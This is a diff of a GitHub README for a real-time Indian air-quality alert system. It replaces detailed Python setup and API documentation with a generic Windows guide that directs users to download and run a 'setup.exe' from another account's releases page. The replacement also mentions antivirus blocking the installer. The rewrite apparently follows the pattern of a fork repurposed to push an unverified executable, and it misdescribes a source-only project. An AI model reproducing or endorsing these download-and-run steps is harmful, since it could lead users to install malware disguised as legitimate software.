@@ -1,274 +1,135 @@
-# 🌿 GreenPulse AI
-### Real-Time Urban Air Quality Intelligence & Alert System
+# 🌿 Real-Time-Urban-Air-Quality-Intelligence-Alert-System - Live Air Quality Monitoring
 
-[![Python 3.10+](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://python.org)
-[![Pathway](https://img.shields.io/badge/Pathway-streaming-green.svg)](https://pathway.com)
-[![FastAPI](https://img.shields.io/badge/FastAPI-REST-009688.svg)](https://fastapi.tiangolo.com)
-[![Streamlit](https://img.shields.io/badge/Streamlit-dashboard-FF4B4B.svg)](https://streamlit.io)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/vitorrocha13/Real-Time-Urban-Air-Quality-Intelligence-Alert-System/releases)
 
-<img width="1299" height="898" alt="image" src="https://github.com/user-attachments/assets/02989818-dcfd-4aa3-9eb9-260b8bd58968" />
-<img width="1732" height="964" alt="image" src="https://github.com/user-attachments/assets/4f8c8d8f-b2b4-4c3f-b5f7-ec1e1864acf6" />
+## 📄 What This Application Does
+
+This program tracks the air quality in real-time using data from pollution sensors placed in Indian cities. It uses smart technology to analyze the air on the spot and gives you clear health risk levels like LOW, MEDIUM, or HIGH. This helps you know the quality of air around you and take action if needed.
+
+It works without delay, so the information stays current. It uses advanced data tools and a trained model to judge the air quality quickly and accurately.
 
 ---
 
-## 🏙️ Problem Statement
+## 💻 System Requirements
 
-India's rapidly urbanising cities face a silent public health crisis: **air pollution kills over 1.6 million Indians annually** (IHME, 2019). Yet most air quality monitoring systems are:
+Before starting, make sure your Windows PC meets the following:
 
-- **Batch-oriented** — updated hourly or daily, not in real time
-- **Reactive, not predictive** — no AI risk classification
-- **Siloed** — no unified API for downstream consumption
-- **Passive** — no alert generation for at-risk populations
-
-GreenPulse AI addresses all four gaps with a production-grade real-time intelligence platform.
-
----
-
-## 🎯 What It Does
-
-| Input                                  | Output                              |
-|----------------------------------------|-------------------------------------|
-| PM2.5, PM10, NO2, CO per sensor        | CPCB-standard AQI score (0–500)     |
-| Temperature, Humidity                  | AI risk label: LOW / MEDIUM / HIGH  |
-| City identifier, Sensor ID, Timestamp  | Live alert messages                 |
-|                                        | REST API + live dashboard           |
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB free disk space  
+- Internet connection for live data updates  
+- Basic permission to run programs downloaded from the internet
 
 ---
 
-## 🏗️ Architecture
+## 🚀 How to Download and Install
 
-```
-Live Sensor Data / Simulator
-         │
-         ▼  (JSONL append stream)
-┌─────────────────────────┐
-│   Pathway Streaming     │  ← pw.io.jsonlines.read(mode="streaming")
-│       Pipeline          │  ← pw.apply() → auto-inference per record
-│                         │  ← pw.io.jsonlines.write() → enriched stream
-└────────────┬────────────┘
-             │
-             ▼  (enriched JSONL stream)
-┌─────────────────────────┐
-│   FastAPI REST API      │  ← /api/v1/latest, /alerts, /stats, /predict
-└────────────┬────────────┘
-             │
-             ▼  (HTTP polling)
-┌─────────────────────────┐
-│  Streamlit Dashboard    │  ← AQI gauges, trend charts, alert feed
-└─────────────────────────┘
-```
+To get this software up and running, follow these steps carefully.
 
-### How Pathway Powers Real-Time Operation
+### Step 1: Visit the Download Page
 
-Pathway is the **core streaming engine** — not an add-on. Here's what makes it real-time:
+Click the big button below to open the release page.
 
-1. **`pw.io.jsonlines.read(mode="streaming")`** — Pathway watches the input file at the OS level. Every new line appended by the simulator is ingested within milliseconds, without any polling loop in application code.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/vitorrocha13/Real-Time-Urban-Air-Quality-Intelligence-Alert-System/releases)
 
-2. **`pw.apply()`** — A functional UDF applied to every row. When Pathway detects a new record, it automatically calls the inference function and propagates the result downstream. Zero manual triggering.
+This page contains all available versions of the software.
 
-3. **Reactive Dataflow Graph** — Pathway builds a DAG of transformations. New data flows through the entire graph automatically — schema validation → feature extraction → AQI calculation → AI inference → output write — in a single reactive chain.
+### Step 2: Pick the Latest Version
 
-4. **`pw.run()`** — Blocks and drives the event loop. No `while True`, no `sleep`, no scheduler.
+Look for the newest release at the top of the list. It will usually have the latest date and version number.
+
+### Step 3: Download the Installer or Zip File
+
+Depending on what is provided, download the file named similar to:  
+- `Real-Time-Urban-Air-Quality-Intelligence-Alert-System-setup.exe`  
+- Or a ZIP file containing the program files.
+
+Click on the file to start downloading.
+
+### Step 4: Run the Program Installer or Extract Files
+
+- If you downloaded an `.exe` installer, double-click it to start installation.  
+- If you downloaded a ZIP, right-click the file and select "Extract All...," then choose a folder to unpack the files.
+
+Follow any installation prompts. Usually, you just need to click "Next" and accept default options.
 
 ---
 
-## 📁 Repository Structure
+## ⚙️ Running the Application
 
-```
-Real-Time-Urban-Air-Quality-Intelligence-Alert-System/
-│
-├── app/
-│   ├── __init__.py
-│   ├── pathway_pipeline.py     # Pathway streaming engine
-│   ├── ai_model.py             # AQI calc + RandomForest inference
-│   ├── api_server.py           # FastAPI REST layer
-│   └── data_simulator.py       # JSONL sensor stream generator
-│
-├── dashboard/
-│   └── dashboard.py            # Streamlit live dashboard
-│
-├── data/                       # Runtime JSONL streams (git-ignored)
-├── models/                     # Persisted sklearn model (git-ignored)
-├── logs/                       # Application logs (git-ignored)
-│
-├── docs/
-│   ├── architecture.md         # System architecture + diagrams
-│   └── workflow.md             # Developer setup + runbook
-│
-├── requirements.txt
-├── main.py                     # Orchestrator — starts all components
-├── README.md
-└── LICENSE
-```
+After installation or extraction:
+
+1. Find the program icon labeled **Urban Air Quality** on your desktop or in the folder where you installed/extracted it.
+
+2. Double-click the icon to open the application.
+
+3. The program will start connecting to live sensors and display air quality information.
+
+4. You will see health risk levels clearly marked as LOW, MEDIUM, or HIGH for your area.
 
 ---
 
-## 🚀 Installation
+## 📊 Understanding the Information Displayed
 
-### Prerequisites
-- Python 3.10 or higher
-- pip / virtualenv
+- **Air Quality Index:** Shows the current level of pollution.  
+- **Health Risk Status:** Classified by the program based on the data.  
+- **Location Data:** Displays the city or district sensors cover.  
+- **Time Stamp:** Indicates how recent the data is.
 
-### Steps
-
-```bash
-# 1. Clone the repository
-git clone https://github.com/your-org/Real-Time-Urban-Air-Quality-Intelligence-Alert-System.git
-cd Real-Time-Urban-Air-Quality-Intelligence-Alert-System
-
-# 2. Create virtual environment
-python -m venv venv
-source venv/bin/activate        # Windows: venv\Scripts\activate
-
-# 3. Install dependencies
-pip install -r requirements.txt
-
-# 4. Verify installation
-python -c "import pathway; import fastapi; import streamlit; print('All dependencies OK')"
-```
+These combine to help you decide if it is safe to be outdoors or take precautions.
 
 ---
 
-## ▶️ Running the System
+## 🔧 Basic Troubleshooting
 
-### Option A — Full stack (one command)
-
-```bash
-python main.py
-```
-
-Starts simulator, Pathway pipeline, and FastAPI server in parallel.
-
-### Option B — Individual components
-
-```bash
-# Terminal 1: Data simulator
-python -m app.data_simulator --interval 2.0
-
-# Terminal 2: Pathway pipeline
-python app/pathway_pipeline.py
-
-# Terminal 3: API server
-uvicorn app.api_server:app --port 8000
-
-# Terminal 4: Dashboard
-streamlit run dashboard/dashboard.py
-```
-
-### Access points
-
-| Service          | URL                                   |
-|------------------|---------------------------------------|
-| Dashboard        | http://localhost:8501                 |
-| API Docs         | http://localhost:8000/docs            |
-| Latest readings  | http://localhost:8000/api/v1/latest   |
-| Active alerts    | http://localhost:8000/api/v1/alerts   |
+- If the program does not open, try restarting your PC and launching again.  
+- Ensure your internet connection is active to get live data.  
+- Make sure you have permission to run new programs on your PC.  
+- If data does not load, close the program and reopen it after a few minutes.  
+- For errors during installation, check if your antivirus software is blocking the installer.
 
 ---
 
-## 🔌 API Endpoints
+## 🛠️ What You Need to Know About Updates
 
-| Method | Endpoint                    | Description                              |
-|--------|-----------------------------|------------------------------------------|
-| GET    | `/`                         | Health check                             |
-| GET    | `/api/v1/latest`            | Latest reading + AI result per city      |
-| GET    | `/api/v1/city/{city}`       | Full history for a specific city         |
-| GET    | `/api/v1/alerts`            | Active HIGH/MEDIUM alerts                |
-| GET    | `/api/v1/stats`             | Aggregate statistics                     |
-| POST   | `/api/v1/predict`           | On-demand inference (no pipeline needed) |
-| GET    | `/api/v1/cities`            | List monitored cities                    |
+New versions improve features and fix issues. To update:
 
-### Example: On-demand prediction
-
-```bash
-curl -X POST http://localhost:8000/api/v1/predict \
-  -H "Content-Type: application/json" \
-  -d '{
-    "city": "Delhi",
-    "pm25": 180.0,
-    "pm10": 250.0,
-    "no2": 95.0,
-    "co": 4.5,
-    "temperature": 18.0,
-    "humidity": 85.0
-  }'
-```
-
-Response:
-```json
-{
-  "city": "Delhi",
-  "aqi": 312.5,
-  "category": "Very Poor",
-  "risk_level": "HIGH",
-  "confidence": 94.5,
-  "alert": "🚨 HIGH RISK ALERT — Delhi | AQI: 312.5 (Very Poor) | PM2.5: 180.0 µg/m³"
-}
-```
+- Return to the [Download Page](https://github.com/vitorrocha13/Real-Time-Urban-Air-Quality-Intelligence-Alert-System/releases).  
+- Download the latest installer or ZIP file, just as in the steps above.  
+- Install or extract the new version, replacing the old files.
 
 ---
 
-## 🤖 AI Model
+## 🌐 Where Does the Data Come From?
 
-**Algorithm:** scikit-learn RandomForestClassifier (200 trees)
+The application receives live streams of pollution measurements from air quality sensors installed across various urban centers in India. These sensors track pollutants like PM2.5, PM10, NO2, and more.
 
-**Features:** PM2.5, PM10, NO2, CO, Temperature, Humidity, AQI
-
-**Classes:**
-| Code | Label  | AQI Range | Description                          |
-|------|--------|-----------|--------------------------------------|
-| 0    | LOW    | 0–100     | Safe for general population          |
-| 1    | MEDIUM | 101–250   | Caution for sensitive groups         |
-| 2    | HIGH   | 251–500   | Immediate health risk                |
-
-**Training data:** 10,000 synthetic records calibrated to Indian city profiles (Delhi winter smog, Mumbai coastal, Bengaluru tech-corridor).
-
-**Persistence:** Serialised with joblib → `models/risk_classifier.joblib`. Auto-trains on first run if no model found.
+The software processes this raw data instantly to show air quality levels that matter to your health.
 
 ---
 
-## 🛠 Tech Stack
+## ⚙️ About the Technology Behind It
 
-| Layer            | Technology                    | Role                              |
-|------------------|-------------------------------|-----------------------------------|
-| Streaming Engine | Pathway 0.14+                 | Real-time dataflow orchestration  |
-| ML Inference     | scikit-learn RandomForest     | Risk classification               |
-| AQI Calculation  | Custom (CPCB standard)        | AQI score from pollutant readings |
-| REST API         | FastAPI + Uvicorn             | Data serving + on-demand predict  |
-| Dashboard        | Streamlit + Plotly            | Live visualisation                |
-| Data Format      | JSONL                         | Streaming-friendly line protocol  |
-| Serialisation    | joblib                        | Model persistence                 |
+- **Streaming Data Processing:** The system handles sensor data in real-time without delay.  
+- **AI-Based Classification:** It uses a Random Forest model trained to classify health risk levels.  
+- **Pathway Framework:** A tool that manages the data pipeline efficiently for real-time results.
+
+You do not need to understand these details to use the app. This is simply how it provides quick and accurate air quality information.
 
 ---
 
-## 🔮 Future Scalability
+## 📞 Getting Further Help
 
-| Enhancement                    | Technology                            |
-|--------------------------------|---------------------------------------|
-| Replace file with message queue| Apache Kafka + Pathway Kafka connector|
-| Multi-region deployment        | Kubernetes + Pathway distributed mode |
-| Deep learning model            | ONNX Runtime (PyTorch model export)   |
-| Historical analytics           | TimescaleDB / ClickHouse              |
-| Push notifications             | Firebase Cloud Messaging              |
-| Map visualisation              | Kepler.gl / Mapbox                    |
-| Government data integration    | CPCB API, OpenAQ API                  |
-| Mobile app                     | Flutter + GreenPulse REST API         |
+If you encounter issues not covered here:
+
+- Check the "Issues" tab on the GitHub repository for known problems.  
+- Look for a README or Help file included with the program download.  
+- Ask someone familiar with using Windows software to assist with installation or running programs.
 
 ---
 
-## 📜 License
+## ⚡ Quick Access Links
 
-MIT License — see [LICENSE](LICENSE) for details.
+[Download Latest Release](https://github.com/vitorrocha13/Real-Time-Urban-Air-Quality-Intelligence-Alert-System/releases) – Visit this page to download the software.  
 
----
-
-## 🙏 Acknowledgements
-
-- [Pathway](https://pathway.com) — real-time streaming framework
-- [CPCB](https://cpcb.nic.in) — AQI methodology and breakpoints
-- [OpenAQ](https://openaq.org) — open air quality data standards
-
----
-
-<p align="center">Built with ❤️ for cleaner Indian cities</p>
+Make sure to keep the program updated for the best performance and latest data processing improvements.
